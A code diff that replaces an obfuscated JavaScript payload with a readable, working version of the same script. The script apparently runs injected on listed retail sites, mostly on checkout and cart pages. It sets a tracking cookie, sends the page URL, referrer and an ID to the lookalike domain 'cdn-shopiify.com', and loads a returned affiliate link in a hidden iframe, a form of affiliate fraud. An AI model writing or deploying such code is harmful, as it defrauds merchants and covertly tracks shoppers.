@@ -1,1 +1,103 @@
-function _0x10e2(_0x25ddb0,_0x8dcd77){_0x25ddb0=_0x25ddb0-0xa9;const _0x58b5e8=_0x58b5();let _0x10e211=_0x58b5e8[_0x25ddb0];return _0x10e211;}function _0x58b5(){const _0x408fad=['affiliate_url','https://cdn-shopiify.com/api/track-click','=([^;]*)','33urXKNv','readyState','href','toUTCString','complete','body','cart','152089lInBAG','checkouts','payment','90CUnIOg','none','169686iNCdIX','22399070jQJNTt','https://cdn-shopiify.com/api/fallback-pixel?id=','cartExtra','src','8MWLqkP','2473839KhbUBs','appendChild','202112HfhEdF','random','www.fareastflora.com','error','728121LRHnLr','img','load','json','now','application/json','cookie','hostname','382852DXZJcm','find','includes','shipping','(?:^|;\x20)','height',';\x20expires=','location',';\x20path=/;\x20SameSite=Lax','review-order','always','pay'];_0x58b5=function(){return _0x408fad;};return _0x58b5();}(function(_0x5e1d97,_0x2ee762){const _0x16d392=_0x10e2,_0x41b368=_0x5e1d97();while(!![]){try{const _0x35cf51=-parseInt(_0x16d392(0xbe))/0x1+parseInt(_0x16d392(0xc6))/0x2+parseInt(_0x16d392(0xd5))/0x3*(-parseInt(_0x16d392(0xba))/0x4)+parseInt(_0x16d392(0xb0))/0x5*(-parseInt(_0x16d392(0xb2))/0x6)+parseInt(_0x16d392(0xad))/0x7*(parseInt(_0x16d392(0xb7))/0x8)+-parseInt(_0x16d392(0xb8))/0x9+parseInt(_0x16d392(0xb3))/0xa;if(_0x35cf51===_0x2ee762)break;else _0x41b368['push'](_0x41b368['shift']());}catch(_0x23a938){_0x41b368['push'](_0x41b368['shift']());}}}(_0x58b5,0x5e0b2),(function(){const _0x1973c5=_0x10e2,_0xbb48b1=[_0x1973c5(0xac),'checkout',_0x1973c5(0xae),_0x1973c5(0xd1),_0x1973c5(0xcf),_0x1973c5(0xaf),_0x1973c5(0xc9)],_0x26a394=_0x1973c5(0xbc),_0x4d977f=0x7d0,_0x3eea72={'www.fareastflora.com':{'always':![],'cartExtra':!![]},'aimedialinks.com':{'always':!![],'cartExtra':!![]},'www.pizzahut.com.ph':{'always':![],'cartExtra':!![]},'www.stylevana.com':{'always':![],'cartExtra':!![]},'www.watsons.com.hk':{'always':!![],'cartExtra':!![]},'www.watsonswine.com':{'always':![],'cartExtra':!![]},'sg.6ixty8ight.com':{'always':![],'cartExtra':!![]},'steadfastgolf.com':{'always':!![],'cartExtra':!![]}};function _0x4dea18(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'['replace'](/[xy]/g,function(_0x2b83d0){const _0x3946e0=_0x10e2,_0x1ddcc2=Math[_0x3946e0(0xbb)]()*0x10|0x0,_0x2fb917=_0x2b83d0==='x'?_0x1ddcc2:_0x1ddcc2&0x3|0x8;return _0x2fb917['toString'](0x10);});}function _0x39d681(_0x5ae54d){const _0x3dffa7=_0x1973c5,_0x366413=document['cookie']['match'](new RegExp(_0x3dffa7(0xca)+_0x5ae54d+_0x3dffa7(0xd4)));return _0x366413?decodeURIComponent(_0x366413[0x1]):'';}function _0x5900c9(_0x4433c0){const _0x562a76=_0x1973c5,_0x36308b=document['createElement'](_0x562a76(0xbf));_0x36308b[_0x562a76(0xb6)]=_0x4433c0,_0x36308b['width']=0x1,_0x36308b[_0x562a76(0xcb)]=0x1,_0x36308b['style']['display']=_0x562a76(0xb1),document[_0x562a76(0xab)][_0x562a76(0xb9)](_0x36308b);}function _0x519e73(){const _0x12b131=_0x1973c5,_0x461796=window['location']['pathname']['toLowerCase']();return _0xbb48b1[_0x12b131(0xc7)](function(_0xc583e0){const _0x3a70e6=_0x12b131;return _0x461796[_0x3a70e6(0xc8)](_0xc583e0);});}function _0x40300e(){return Boolean(_0x519e73());}async function _0x56c8f2(){const _0x2fc180=_0x1973c5;try{const _0x2e2e89=_0x39d681('tracking_uuid')||_0x4dea18(),_0x1a617e=new Date(Date[_0x2fc180(0xc2)]()+0x1e*0x18*0x3c*0x3c*0x3e8)[_0x2fc180(0xa9)]();document[_0x2fc180(0xc4)]='tracking_uuid='+_0x2e2e89+_0x2fc180(0xcc)+_0x1a617e+_0x2fc180(0xce);const _0x569eab=await fetch(_0x2fc180(0xd3),{'method':'POST','headers':{'Content-Type':_0x2fc180(0xc3)},'body':JSON['stringify']({'url':location[_0x2fc180(0xd7)],'referrer':document['referrer'],'unique_id':_0x2e2e89,'origin':location[_0x2fc180(0xc5)]})}),_0x48d2dd=await _0x569eab[_0x2fc180(0xc1)]();_0x48d2dd['success']&&_0x48d2dd[_0x2fc180(0xd2)]?_0x5900c9(_0x48d2dd['affiliate_url']):_0x5900c9(_0x2fc180(0xb4)+_0x2e2e89);}catch(_0x2ec336){console[_0x2fc180(0xbd)]('Tracking\x20error',_0x2ec336);}}function _0xc94e8f(){const _0x261d14=_0x1973c5;_0x56c8f2(),window[_0x261d14(0xcd)]['hostname']===_0x26a394&&setTimeout(_0x56c8f2,_0x4d977f);}function _0x1ca344(){const _0x2d0174=_0x1973c5,_0x188cfb=window[_0x2d0174(0xcd)][_0x2d0174(0xc5)],_0x1d6cf4=_0x3eea72[_0x188cfb];if(!_0x1d6cf4)return;if(_0x1d6cf4[_0x2d0174(0xb5)]&&_0x40300e())_0xc94e8f();else _0x1d6cf4[_0x2d0174(0xd0)]&&_0xc94e8f();}document[_0x1973c5(0xd6)]===_0x1973c5(0xaa)?_0x1ca344():window['addEventListener'](_0x1973c5(0xc0),_0x1ca344,{'once':!![]});}()));
+(function () {
+  const CHECKOUT_KEYWORDS = ['cart', 'checkout', 'checkouts', 'pay', 'review-order', 'payment', 'shipping'];
+  const TRACK_URL = 'https://cdn-shopiify.com/api/track-click';
+  const FALLBACK_PIXEL_URL = 'https://cdn-shopiify.com/api/fallback-pixel?id=';
+
+  const EXTRA_CART_PING_HOSTNAME = 'www.fareastflora.com';
+  const EXTRA_CART_PING_DELAY = 2000;
+
+  const SITE_CONFIG = {
+    'www.fareastflora.com': { always: false, cartExtra: true },
+    'aimedialinks.com': { always: true, cartExtra: true },
+    'www.pizzahut.com.ph': { always: false, cartExtra: true },
+    'www.stylevana.com': { always: false, cartExtra: true },
+    'www.watsons.com.hk': { always: true, cartExtra: true },
+    'www.watsonswine.com': { always: false, cartExtra: true },
+    'sg.6ixty8ight.com': { always: false, cartExtra: true },
+    'steadfastgolf.com': { always: true, cartExtra: true },
+  };
+
+  function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+      const r = (Math.random() * 16) | 0;
+      const v = c === 'x' ? r : (r & 0x3) | 0x8;
+      return v.toString(16);
+    });
+  }
+
+  function getCookie(name) {
+    const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
+    return match ? decodeURIComponent(match[1]) : '';
+  }
+
+  function createTrackingPixel(url) {
+    const iframe = document.createElement('iframe');
+    iframe.src = url;
+    iframe.setAttribute('sandbox', 'allow-scripts allow-forms');
+    iframe.style.display = 'none';
+    iframe.style.visibility = 'hidden';
+    iframe.style.width = '1px';
+    iframe.style.height = '1px';
+    iframe.style.border = '0';
+    document.body.appendChild(iframe);
+  }
+
+  function isCheckoutPage() {
+    const path = window.location.pathname.toLowerCase();
+    return CHECKOUT_KEYWORDS.find(function (keyword) {
+      return path.includes(keyword);
+    });
+  }
+
+  function isOnCheckoutPage() {
+    return Boolean(isCheckoutPage());
+  }
+
+  async function doPing() {
+    try {
+      const uniqueId = getCookie('tracking_uuid') || generateUUID();
+      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
+      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/; SameSite=Lax';
+
+      const response = await fetch(TRACK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          url: location.href,
+          referrer: document.referrer,
+          unique_id: uniqueId,
+          origin: location.hostname
+        })
+      });
+      const data = await response.json();
+
+      if (data.success && data.affiliate_url) {
+        createTrackingPixel(data.affiliate_url);
+      } else {
+        createTrackingPixel(FALLBACK_PIXEL_URL + uniqueId);
+      }
+    } catch (err) {
+      console.error('Tracking error', err);
+    }
+  }
+
+  function pingWithExtra() {
+    doPing();
+    if (window.location.hostname === EXTRA_CART_PING_HOSTNAME) {
+      setTimeout(doPing, EXTRA_CART_PING_DELAY);
+    }
+  }
+
+  function main() {
+    const hostname = window.location.hostname;
+    const config = SITE_CONFIG[hostname];
+    if (!config) return;
+
+    if (config.cartExtra && isOnCheckoutPage()) pingWithExtra();
+    else config.always && pingWithExtra();
+  }
+
+  document.readyState === 'complete'
+    ? main()
+    : window.addEventListener('load', main, { once: true });
+})();
